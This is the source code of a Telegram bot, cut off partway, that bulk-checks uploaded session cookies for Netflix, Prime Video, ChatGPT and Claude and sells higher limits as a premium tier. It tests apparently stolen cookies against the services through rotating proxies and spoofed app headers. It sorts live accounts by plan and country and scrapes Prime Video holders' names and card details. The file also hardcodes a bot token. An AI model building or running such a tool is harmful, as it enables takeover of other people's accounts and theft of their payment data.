#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Unified Cookie Checker Bot
Checkers: Netflix Bulk, Netflix Token, Prime Video, ChatGPT, Claude
Subscription: Free (50 cookies/check) | Premium (unlimited) | Admin (unlimited)
"""

import asyncio
import base64
import json
import logging
import os
import re
import sqlite3
import sys
import urllib.parse
import zipfile
from collections import defaultdict
from datetime import datetime, timedelta
from io import BytesIO
from typing import Any, Dict, List, Optional, Tuple

for pkg in ("telegram", "aiohttp", "curl_cffi", "requests", "aiofiles", "urllib3"):
    try:
        __import__(pkg)
    except ImportError:
        print(f"[ERROR] Missing: {pkg}")
        print("Run: pip install python-telegram-bot aiohttp curl_cffi requests aiofiles urllib3")
        sys.exit(1)

import aiohttp
import requests
import urllib3
from curl_cffi.requests import AsyncSession
from telegram import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Update,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)
from telegram.request import HTTPXRequest

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", level=logging.INFO)
log = logging.getLogger("main_bot")

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

BOT_TOKEN  = "8705914855:AAF8xGJtX-jgamaCW6VsmALD1jTVSWcL8ZQ"
ADMIN_IDS  = [1878272964]
WATERMARK  = "– Checked By @IPTVLinkschat"

FREE_COOKIE_LIMIT    = 50      # max cookies per check for free users
CONNECT_TIMEOUT      = 30.0
READ_TIMEOUT         = 30.0
WRITE_TIMEOUT        = 30.0
POOL_TIMEOUT         = 30.0
DB_PATH              = "bot_users.db"

KEY_ACTIVE_CHECKER = "active_checker"
KEY_CANCEL_EVENT   = "cancel_event"

CHECKER_NFBULK   = "nfbulk"
CHECKER_NFTOKEN  = "nftoken"
CHECKER_PRIME    = "prime"
CHECKER_CHATGPT  = "chatgpt"
CHECKER_CLAUDE   = "claude"

# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE  (SQLite, thread-safe via lock)
# ══════════════════════════════════════════════════════════════════════════════

_db_lock = asyncio.Lock()

def _db_connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def db_init():
    conn = _db_connect()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid         INTEGER PRIMARY KEY,
            username    TEXT,
            first_name  TEXT,
            joined_at   TEXT DEFAULT (datetime('now')),
            is_banned   INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS subscriptions (
            uid         INTEGER PRIMARY KEY,
            tier        TEXT DEFAULT 'free',   -- 'free' | 'premium'
            expires_at  TEXT,                  -- NULL = never (lifetime)
            given_by    INTEGER,               -- admin uid who granted
            given_at    TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS check_log (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            uid         INTEGER,
            checker     TEXT,
            cookies_cnt INTEGER,
            ts          TEXT DEFAULT (datetime('now'))
        );
    """)
    conn.commit()
    conn.close()

# ── sync helpers (called inside run_in_executor) ──────────────────────────────

def _db_upsert_user(uid: int, username: str, first_name: str):
    conn = _db_connect()
    conn.execute("""
        INSERT INTO users (uid, username, first_name) VALUES (?,?,?)
        ON CONFLICT(uid) DO UPDATE SET username=excluded.username, first_name=excluded.first_name
    """, (uid, username or "", first_name or ""))
    conn.execute("""
        INSERT OR IGNORE INTO subscriptions (uid, tier) VALUES (?, 'free')
    """, (uid,))
    conn.commit()
    conn.close()

def _db_get_sub(uid: int) -> Optional[sqlite3.Row]:
    conn  = _db_connect()
    row   = conn.execute("SELECT * FROM subscriptions WHERE uid=?", (uid,)).fetchone()
    conn.close()
    return row

def _db_set_premium(uid: int, days: Optional[int], given_by: int):
    """days=None → lifetime premium"""
    expires = None if days is None else (datetime.utcnow() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    conn = _db_connect()
    conn.execute("""
        INSERT INTO subscriptions (uid, tier, expires_at, given_by)
        VALUES (?,?,?,?)
        ON CONFLICT(uid) DO UPDATE SET tier='premium', expires_at=excluded.expires_at, given_by=excluded.given_by, given_at=datetime('now')
    """, (uid, "premium", expires, given_by))
    conn.commit()
    conn.close()

def _db_remove_premium(uid: int):
    conn = _db_connect()
    conn.execute("UPDATE subscriptions SET tier='free', expires_at=NULL WHERE uid=?", (uid,))
    conn.commit()
    conn.close()

def _db_log_check(uid: int, checker: str, cnt: int):
    conn = _db_connect()
    conn.execute("INSERT INTO check_log (uid,checker,cookies_cnt) VALUES (?,?,?)", (uid, checker, cnt))
    conn.commit()
    conn.close()

def _db_all_users() -> list:
    conn  = _db_connect()
    rows  = conn.execute("""
        SELECT u.uid, u.username, u.first_name, s.tier, s.expires_at
        FROM users u LEFT JOIN subscriptions s ON u.uid=s.uid
        ORDER BY s.tier DESC, u.joined_at DESC
        LIMIT 50
    """).fetchall()
    conn.close()
    return rows

def _db_stats() -> dict:
    conn = _db_connect()
    total   = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    premium = conn.execute("SELECT COUNT(*) FROM subscriptions WHERE tier='premium'").fetchone()[0]
    checks  = conn.execute("SELECT COUNT(*), SUM(cookies_cnt) FROM check_log").fetchone()
    conn.close()
    return {"total": total, "premium": premium,
            "checks": checks[0] or 0, "cookies": checks[1] or 0}

# ── async wrappers ─────────────────────────────────────────────────────────────

async def db_upsert_user(uid: int, username: str, first_name: str):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _db_upsert_user, uid, username, first_name)

async def db_get_tier(uid: int) -> str:
    """Returns 'admin' | 'premium' | 'free'"""
    if uid in ADMIN_IDS:
        return "admin"
    loop = asyncio.get_event_loop()
    row  = await loop.run_in_executor(None, _db_get_sub, uid)
    if not row or row["tier"] == "free":
        return "free"
    # check expiry
    if row["expires_at"]:
        exp = datetime.strptime(row["expires_at"], "%Y-%m-%d %H:%M:%S")
        if datetime.utcnow() > exp:
            # auto-downgrade
            await asyncio.get_event_loop().run_in_executor(None, _db_remove_premium, uid)
            return "free"
    return "premium"

async def db_set_premium(uid: int, days: Optional[int], given_by: int):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _db_set_premium, uid, days, given_by)
    await db_upsert_user(uid, "", "")   # ensure user row exists

async def db_remove_premium(uid: int):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _db_remove_premium, uid)

async def db_log_check(uid: int, checker: str, cnt: int):
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _db_log_check, uid, checker, cnt)

# ══════════════════════════════════════════════════════════════════════════════
#  ACCESS CONTROL
# ══════════════════════════════════════════════════════════════════════════════

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

async def get_limit(uid: int) -> Optional[int]:
    """None = unlimited"""
    tier = await db_get_tier(uid)
    if tier in ("admin", "premium"):
        return None
    return FREE_COOKIE_LIMIT

def tier_badge(tier: str) -> str:
    return {"admin": "👑 Admin", "premium": "⭐ Premium", "free": "🆓 Free"}.get(tier, "🆓 Free")

# ══════════════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════════════════════

def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Start / Restart", callback_data="menu_start")],
        [
            InlineKeyboardButton("🎬 Netflix Checker",      callback_data=f"run_{CHECKER_NFBULK}"),
            InlineKeyboardButton("🏆 Crunchyroll Checker",  callback_data="run_crunchyroll"),
        ],
        [
            InlineKeyboardButton("🟢 Hotstar Cookies",      callback_data="run_hotstar"),
            InlineKeyboardButton("🎥 Prime Video",           callback_data=f"run_{CHECKER_PRIME}"),
        ],
        [InlineKeyboardButton("🤖 ChatGPT Checker",         callback_data=f"run_{CHECKER_CHATGPT}")],
        [InlineKeyboardButton("🧠 Claude Checker",          callback_data=f"run_{CHECKER_CLAUDE}")],
        [InlineKeyboardButton("🔑 NF Token Checker",        callback_data=f"run_{CHECKER_NFTOKEN}")],
        [InlineKeyboardButton("🛑 Stop Checker",            callback_data="stop_checker")],
    ])

def back_stop_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 Stop",      callback_data="stop_checker"),
        InlineKeyboardButton("🏠 Main Menu", callback_data="menu_start"),
    ]])

def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🏠 Main Menu", callback_data="menu_start")
    ]])

def build_main_menu_text(tier: str) -> str:
    badge = tier_badge(tier)
    limit = f"<code>{FREE_COOKIE_LIMIT}</code> cookies/check" if tier == "free" else "Unlimited ✨"
    return (
        f"🔰 <b>Cookie Checker Bot</b>\n\n"
        f"Your Plan : {badge}\n"
        f"Limit     : {limit}\n\n"
        f"Ek checker choose karo aur <code>.txt</code> ya <code>.zip</code> bhejo.\n"
        f"• <code>.txt</code> — single ya multi-account\n"
        f"• <code>.zip</code> — multiple files inside"
    )

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class ProxyManager:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self._idx    = 0
        self._lock   = asyncio.Lock()

    @classmethod
    def load(cls, path: str = "proxy.txt") -> Optional["ProxyManager"]:
        if not os.path.exists(path):
            return None
        proxies = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(cls._norm(line))
        return cls(proxies) if proxies else None

    @staticmethod
    def _norm(proxy: str) -> str:
        if "://" in proxy: return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        return f"http://{proxy}"

    async def next(self) -> str:
        async with self._lock:
            p = self.proxies[self._idx % len(self.proxies)]
            self._idx += 1
            return p

PROXY_MGR: Optional[ProxyManager] = ProxyManager.load()

# ══════════════════════════════════════════════════════════════════════════════
#  COMMON UTILITIES
# ══════════════════════════════════════════════════════════════════════════════

def make_bar(done: int, total: int, width: int = 16) -> str:
    pct    = int(done / total * 100) if total else 0
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled) + f" {pct}%"

def safe_unquote(v: str) -> str:
    v = v.strip().strip('"\'')
    if "%" in v: v = urllib.parse.unquote(v)
    if "%" in v: v = urllib.parse.unquote(v)
    return v

def extract_zip_txts(raw: bytes) -> List[Tuple[str, str]]:
    out = []
    try:
        with zipfile.ZipFile(BytesIO(raw)) as zf:
            for name in zf.namelist():
                if name.startswith("__MACOSX") or name.endswith("/"):
                    continue
                lower = name.lower()
                if lower.endswith((".txt", ".cookies")) or "." not in os.path.basename(name):
                    try:
                        content = zf.read(name).decode("utf-8", errors="ignore")
                        if content.strip():
                            out.append((os.path.basename(name), content))
                    except Exception:
                        pass
    except zipfile.BadZipFile:
        pass
    return out

async def download_file(bot, doc) -> Optional[bytes]:
    try:
        f   = await bot.get_file(doc.file_id)
        buf = BytesIO()
        await f.download_to_memory(buf)
        return buf.getvalue()
    except Exception as e:
        log.error(f"download_file: {e}")
        return None

def get_cancel(ctx: ContextTypes.DEFAULT_TYPE) -> asyncio.Event:
    if KEY_CANCEL_EVENT not in ctx.user_data:
        ctx.user_data[KEY_CANCEL_EVENT] = asyncio.Event()
    ev: asyncio.Event = ctx.user_data[KEY_CANCEL_EVENT]
    ev.clear()
    return ev

# ══════════════════════════════════════════════════════════════════════════════
#  CHECKER 1 — NETFLIX BULK
# ══════════════════════════════════════════════════════════════════════════════

NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NF_PARAMS  = {
    "appVersion":"15.48.1","device_type":"NFAPPL-02-",
    "esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom":"phone","iosVersion":"15.8.5","isTablet":"false",
    "languages":"en-US","locale":"en-US","maxDeviceWidth":"375",
    "model":"saget","modelType":"IPHONE8-1","odpAware":"true",
    "path":'["account","token","default"]',"pathFormat":"graph",
    "pixelDensity":"2.0","progressive":"false","responseFormat":"json",
    "config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true"}',
}
NF_HEADERS = {
    "User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt":"1",
    "x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true",
    "x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4",
    "x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375",
    "x-netflix.context.ab-tests":"","x-netflix.client.type":"argo",
    "x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales":"en-US",
    "x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1",
    "x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5",
    "x-netflix.request.client.context":'{"appState":"foreground"}',
    "x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9",
    "x-netflix.context.pixel-density":"2.0",
    "x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid":"Asia/Dhaka",
    "x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
}

def nf_extract_id(content: str) -> Optional[str]:
    for line in content.splitlines():
        s = line.strip()
        if re.match(r"^NetflixId\s*=\s*", s, re.I):
            val = re.sub(r"^NetflixId\s*=\s*", "", s, flags=re.I)
            val = safe_unquote(val)
            if val: return val
    for line in content.splitlines():
        s = line.strip()
        if s.startswith("#HttpOnly_"): s = s[len("#HttpOnly_"):]
        if s.startswith("#") or not s: continue
        parts = s.split("\t")
        if len(parts) >= 7 and parts[5].lower() == "netflixid":
            return safe_unquote(parts[6])
    try:
        data = json.loads(content)
        if isinstance(data, dict): data = data.get("cookies") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict) and c.get("name","").lower() == "netflixid":
                    return safe_unquote(str(c.get("value","")))
    except Exception:
        pass
    m = re.search(r"NetflixId\s*[:=]\s*(\S+)", content, re.I)
    return safe_unquote(m.group(1)) if m else None

async def nf_check_one(session: aiohttp.ClientSession, netflix_id: str) -> bool:
    hdrs = dict(NF_HEADERS)
    hdrs["Cookie"] = f"NetflixId={netflix_id}"
    try:
        async with session.get(NF_API_URL, params=NF_PARAMS, headers=hdrs, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200: return False
            data = await r.json(content_type=None)
        token = (((data.get("value") or {}).get("account") or {})
                 .get("token",{}).get("default",{}).get("token"))
        return bool(token)
    except Exception:
        return False

async def run_nfbulk(cookie_files, msg, cancel):
    total   = len(cookie_files)
    counter = {"hit":0,"dead":0,"err":0}
    hits    = []
    sem     = asyncio.Semaphore(100)
    conn    = aiohttp.TCPConnector(ssl=False, limit=200, ttl_dns_cache=300)

    async def worker(fname, content):
        if cancel.is_set(): counter["err"]+=1; return
        nid = nf_extract_id(content)
        if not nid: counter["err"]+=1; return
        async with sem:
            if cancel.is_set(): counter["err"]+=1; return
            alive = await nf_check_one(session, nid)
        if alive: counter["hit"]+=1; hits.append((fname,nid))
        else: counter["dead"]+=1

    async def progress():
        while True:
            await asyncio.sleep(3)
            done = sum(counter.values())
            try:
                await msg.edit_text(
                    f"⏳ <b>Netflix Bulk...</b>\n{make_bar(done,total)}\n"
                    f"📦 {done}/{total}  ✅<code>{counter['hit']}</code>  ❌<code>{counter['dead']}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            except Exception: pass

    async with aiohttp.ClientSession(connector=conn) as session:
        pt = asyncio.create_task(progress())
        await asyncio.gather(*[worker(fn,ct) for fn,ct in cookie_files])
        pt.cancel()
        try: await pt
        except asyncio.CancelledError: pass

    buf = BytesIO()
    seen: Dict[str,int] = {}
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for fname,nid in hits:
            base = os.path.splitext(fname)[0]
            key  = base.lower()
            seen[key] = seen.get(key,0)+1
            arc = f"{base}.txt" if seen[key]==1 else f"{base}_{seen[key]}.txt"
            zf.writestr(arc, f"NetflixId={nid}\n")
    buf.seek(0)
    return buf, counter, len(hits)

# ══════════════════════════════════════════════════════════════════════════════
#  CHECKER 2 — NETFLIX TOKEN
# ══════════════════════════════════════════════════════════════════════════════

NFTOKEN_PLAN_MAP = [
    (re.compile(r"premium",re.I),"Premium"),(re.compile(r"standard",re.I),"Standard"),
    (re.compile(r"basic",re.I),"Basic"),(re.compile(r"mobile",re.I),"Mobile"),
    (re.compile(r"student",re.I),"Student"),(re.compile(r"ads?",re.I),"WithAds"),
]
CANONICAL_NF = {"netflixid":"NetflixId","securenetflixid":"SecureNetflixId","nfvdid":"nfvdid","memclid":"memclid","flwssn":"flwssn"}

def nft_plan_folder(plan):
    if not plan or plan.strip().lower() in ("unknown",""): return "Unknown"
    for pat,folder in NFTOKEN_PLAN_MAP:
        if pat.search(plan): return folder
    return "Unknown"

def nft_canon(name): return CANONICAL_NF.get(str(name or "").strip().lower(), str(name or "").strip())

def nft_parse_cookies(content):
    entries = {}
    for line in content.splitlines():
        s = line.strip()
        if s.startswith("#HttpOnly_"): s = s[len("#HttpOnly_"):]
        if s.startswith("#") or not s: continue
        parts = s.split("\t")
        if len(parts)>=7:
            entries[nft_canon(parts[5])] = safe_unquote(parts[6])
    if entries.get("NetflixId"): return entries
    try:
        data = json.loads(content)
        if isinstance(data,dict): data = data.get("cookies") or [data]
        if isinstance(data,list):
            for c in data:
                if isinstance(c,dict): entries[nft_canon(c.get("name",""))] = safe_unquote(str(c.get("value","")))
    except Exception: pass
    if entries.get("NetflixId"): return entries
    m = re.search(r"^NetflixId\s*=\s*(.+)$", content, re.I|re.M)
    if m: entries["NetflixId"] = safe_unquote(m.group(1))
    return entries if entries.get("NetflixId") else None

async def nft_generate_token(session, netflix_id, proxy):
    hdrs = dict(NF_HEADERS); hdrs["Cookie"] = f"NetflixId={netflix_id}"
    try:
        async with session.get(NF_API_URL, params=NF_PARAMS, headers=hdrs,
                                proxy=proxy, ssl=False, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200: return None, f"HTTP {r.status}"
            data = await r.json(content_type=None)
        td = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = td.get("token")
        if not token: return None, "Dead — no token"
        expires = td.get("expires")
        if isinstance(expires,int) and len(str(expires))==13: expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {"token":token,"expires":expiry,"expires_unix":expires}, None
    except asyncio.TimeoutError: return None, "Timeout"
    except Exception as e: return None, str(e)

async def nft_validate_account(session, netflix_id, proxy):
    hdrs = {"User-Agent":"Mozilla/5.0","Accept":"text/html","Cookie":f"NetflixId={netflix_id}"}
    try:
        async with session.get("https://www.netflix.com/YourAccount", headers=hdrs,
                                proxy=proxy, ssl=False, allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=20)) as r:
            url  = str(r.url).lower()
            text = await r.text()
            if "login" in url or "signin" in url or r.status!=200: return False,None,None
            country = plan = None
            for pat in [r'"countryOfSignup"\s*:\s*"([^"]+)"',r'"currentCountry"\s*:\s*"([^"]+)"']:
                m = re.search(pat,text)
                if m: country=m.group(1); break
            for pat in [r'"localizedPlanName".*?"value":"([^"]+)"',r'"planName"\s*:\s*"([^"]+)"']:
                m = re.search(pat,text)
                if m: plan=m.group(1); break
            return bool(country), country, plan or "Unknown"
    except Exception: return False,None,None

async def run_nftoken(cookie_files, msg, cancel):
    total   = len(cookie_files)
    counter = {"done":0,"alive":0,"dead":0}
    hits    = []
    sem     = asyncio.Semaphore(10)

    async def process_one(fname, content):
        if cancel.is_set(): counter["dead"]+=1; counter["done"]+=1; return None
        async with sem:
            cookies = nft_parse_cookies(content)
            if not cookies: counter["dead"]+=1; counter["done"]+=1; return None
            nid   = cookies["NetflixId"]
            proxy = await PROXY_MGR.next() if PROXY_MGR else None
            conn  = aiohttp.TCPConnector(ssl=False, limit=1)
            async with aiohttp.ClientSession(connector=conn) as s:
                (tok,err),(valid,country,plan) = await asyncio.gather(
                    nft_generate_token(s,nid,proxy), nft_validate_account(s,nid,proxy))
            counter["done"]+=1
            if err: counter["dead"]+=1; return None
            counter["alive"]+=1
            return {"fname":fname,"raw":content,"plan":plan or "Unknown",
                    "country":country or "Unknown","token":tok["token"],
                    "expires":tok["expires"],"valid_account":valid,"netflix_id":nid}

    async def progress():
        while True:
            await asyncio.sleep(3)
            try:
                await msg.edit_text(
                    f"⏳ <b>NF Token...</b>\n{make_bar(counter['done'],total)}\n"
                    f"📦 {counter['done']}/{total}  ✅<code>{counter['alive']}</code>  ❌<code>{counter['dead']}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=back_stop_kb())
            except Exception: pass

    pt      = asyncio.create_task(progress())
    results = await asyncio.gather(*[process_one(fn,ct) for fn,ct in cookie_files])
    pt.cancel()
    try: await pt
    except asyncio.CancelledError: pass

    hits = [r for r in results if r]
    buf  = BytesIO()
    fc: Dict[str,int] = {}
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for r in hits:
            folder = nft_plan_folder(r["plan"])
            fc[folder] = fc.get(folder,0)+1
            base = os.path.basename(r["fname"])
            if not base.lower().endswith(".txt"): base+=".txt"
            arc = f"{folder}/{base}"
            if arc in zf.namelist(): arc = f"{folder}/{base[:-4]}_{fc[folder]}.txt"
            zf.writestr(arc, r["raw"].encode())
    buf.seek(0)
    return buf, counter

# ══════════════════════════════════════════════════════════════════════════════
#  CHECKER 3 — PRIME VIDEO
# ══════════════════════════════════════════════════════════════════════════════

AMZ_CBL_URL = "https://www.amazon.com/a/code"
PV_UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36"
DEF_HDRS    = {"User-Agent":PV_UA,"Accept-Language":"en-US,en;q=0.9","Accept":"text/html,*/*;q=0.8"}

def pv_normalize(raw):
    if not raw: return ""
    s = raw.strip()
    if s.startswith("[") and s.endswith("]"):
        try:
            arr = json.loads(s)
            lines = ["# Netscape HTTP Cookie File"]
            for c in arr:
                dom = c.get("domain",".amazon.com")
                pfx = "#HttpOnly_" if c.get("httpOnly") and not dom.startswith("#HttpOnly_") else ""
                lines.append(f"{pfx}{dom}\tTRUE\t{c.get('path','/')}\t{'TRUE' if c.get('secure') else 'FALSE'}\t{int(c.get('expirationDate',0))}\t{c.get('name','')}\t{c.get('value','')}")
            return "\n".join(lines)
        except Exception: pass
    if "=" in s and "\t" not in s:
        return "# Netscape HTTP Cookie File\n" + "\n".join(
            f".amazon.com\tTRUE\t/\tFALSE\t0\t{p.split('=',1)[0].strip()}\t{p.split('=',1)[1].strip()}"
            for p in s.split(";") if "=" in p)
    lines = ["# Netscape HTTP Cookie File"]
    for line in s.splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")): continue
        p = line.split("\t")
        if len(p)>=7 and p[5].strip(): lines.append(line)
    return "\n".join(lines) if len(lines)>1 else s

def pv_parse(raw):
    ck = {}
    for line in (raw or "").splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")): continue
        p = line.split("\t")
        if len(p)>=7 and p[5].strip():
            ck[p[5].strip()] = "\t".join(p[6:]).strip().strip('"')
    return ck

def pv_cookie_hdr(cd):
    pairs = []
    for k,v in cd.items():
        ak = re.sub(r"-main-av$","-main",k)
        pairs.extend([f"{ak}={v}"]+([ f"{k}={v}"] if ak!=k else []))
    return "; ".join(pairs)

def pv_validate(cd):
    if not any(k in cd for k in ("at-main","at-main-av","session-token")):
        return {"valid":False,"expired":True,"error":"Missing auth cookies"}
    try:
        r = requests.get(AMZ_CBL_URL, headers={**DEF_HDRS,"Cookie":pv_cookie_hdr(cd)},
                         allow_redirects=False, timeout=10)
        if r.status_code==200 and ("cbl-input-code-form" in r.text or "cbl-registration-field" in r.text):
            return {"valid":True,"expired":False}
        if r.status_code in (301,302,307) and "signin" in r.headers.get("Location",""):
            return {"valid":False,"expired":True,"error":"Session expired"}
        return {"valid":False,"expired":False,"error":f"HTTP {r.status_code}"}
    except Exception as e: return {"valid":False,"expired":False,"error":str(e)}

def pv_fetch_details(cd):
    lc = cd.get("lc-main-av") or cd.get("lc-main") or "en_US"
    info = {"valid":False,"plan":"Prime Video","country":lc.split("_")[-1].upper() if "_" in lc else "US",
            "account_name":None,"payment_method":None,"card_bank":None,"subscription_id":None,
            "profiles":None,"ubid":cd.get("ubid-main-av") or cd.get("ubid-main") or "Unknown","is_subscribed":False}
    try:
        ck_hdr = "; ".join(f"{k}={v}" for k,v in cd.items())
        r = requests.get("https://www.primevideo.com/settings/your-account",
                         headers={**DEF_HDRS,"Cookie":ck_hdr}, allow_redirects=False, timeout=12)
        if r.status_code in (301,302,303,307,308) and "/region/" in r.headers.get("Location",""):
            loc = r.headers.get("Location","")
            r   = requests.get(loc if loc.startswith("http") else f"https://www.primevideo.com{loc}",
                               headers={**DEF_HDRS,"Cookie":ck_hdr}, allow_redirects=False, timeout=12)
        if r.status_code==200:
            t = r.text; info["valid"]=True
            for pat,key in [
                (r'"recordTerritory":\s*"([^"]+)"',"country"),
                (r'subscriptionId=([A-Z0-9]+)',"subscription_id"),
                (r'"name":\s*\{\s*"dvString":\s*\{\s*"attrs":\s*\{},\s*"string":\s*"([^"]+)"',"card_bank"),
                (r'"customerName":\s*"([^"]+)"',"account_name"),
            ]:
                m = re.search(pat,t)
                if m: info[key] = m.group(1).upper() if key=="country" else m.group(1).strip()
            plan_m = re.search(r'"header":\s*\{\s*"title":\s*\{[^}]*"string":\s*"([^"]+)"',t)
            info["plan"] = plan_m.group(1) if plan_m else ("Amazon Prime" if "Amazon Prime" in t else "Prime Video")
            card_m = re.search(r'"paymentMethodNumber":\s*\{\s*"prefix":\s*"([^"]*)",\s*"lastDigits":\s*"([^"]*)"\s*\}',t)
            hdr_m  = re.search(r'"paymentMethodHeader":\s*"([^"]+)"',t)
            exp_m  = re.search(r'"paymentMethodExpirationDate":\s*\{\s*"year":\s*(\d+),\s*"month":\s*(\d+)\s*\}',t)
            if card_m:
                info["payment_method"] = f"{hdr_m.group(1) if hdr_m else 'Card'} •••• {card_m.group(2)}{f' (Exp: {exp_m.group(2)}/{exp_m.group(1)})' if exp_m else ''}"
            profs = re.findall(r'"profileName":\s*"([^"]+)"',t)
            if profs: info["profiles"] = ", ".join(dict.fromkeys(profs))
            info["is_subscribed"] = bool(info["subscription_id"] or info["payment_method"])
        else: info["valid"]=True
    except Exception: pass
    return info

def pv_extract_accounts(text, src="FILE"):
    if not text: return []
    for pat in [r"\r?\n\s*\$\s*(?:\r?\n|$)",r"\r?\n\s*[-=~*]{3,}\s*(?:\r?\n|$)"]:
        if re.search(pat,text):
            raws = [b.strip() for b in re.split(pat,text) if any(k in b for k in ("at-main","session-token","ubid-main"))]
            if raws: return [{"raw":pv_normalize(b),"label":f"{src}#{i+1}"} for i,b in enumerate(raws)]
    if "# Netscape HTTP Cookie File" in text:
        parts = [p.strip() for p in re.split(r"(?=# Netscape HTTP Cookie File)",text,flags=re.I) if p.strip()]
        if len(parts)>1:
            raws = [p for p in parts if any(k in p for k in ("at-main","session-token","ubid-main"))]
            if raws: return [{"raw":pv_normalize(p),"label":f"{src}#{i+1}"} for i,p in enumerate(raws)]
    lines,blocks,curr,seen = text.splitlines(),[],[],False
    for line in lines:
        if ("\tat-main-av\t" in line or "\tat-main\t" in line) and seen:
            blocks.append("\n".join(curr).strip()); curr=[line]
        else:
            if "\tat-main-av\t" in line or "\tat-main\t" in line: seen=True
            curr.append(line)
    if curr: blocks.append("\n".join(curr).strip())
    valid = [b for b in blocks if any(k in b for k in ("at-main","session-token"))]
    if len(valid)>1: return [{"raw":pv_normalize(b),"label":f"{src}#{i+1}"} for i,b in enumerate(valid)]
    if any(k in text for k in ("at-main","session-token","ubid-main")):
        return [{"raw":pv_normalize(text),"label":f"{src}#1"}]
    return []

def pv_build_zip(live_entries, dead_entries, report_lines):
    groups = defaultdict(lambda: defaultdict(list))
    for e in live_entries:
        country = re.sub(r"[^A-Za-z0-9_-]","_",(e["det"].get("country") or "UNKNOWN").strip())
        tier    = "paid" if e["det"].get("is_subscribed") else "free"
        groups[tier][country].append(e)
    buf = BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for tier,countries in groups.items():
            for country,entries in countries.items():
                for idx,e in enumerate(entries,1):
                    det = e["det"]
                    hdr = (f"# Status: LIVE — {'PAID' if tier=='paid' else 'FREE'}\n"
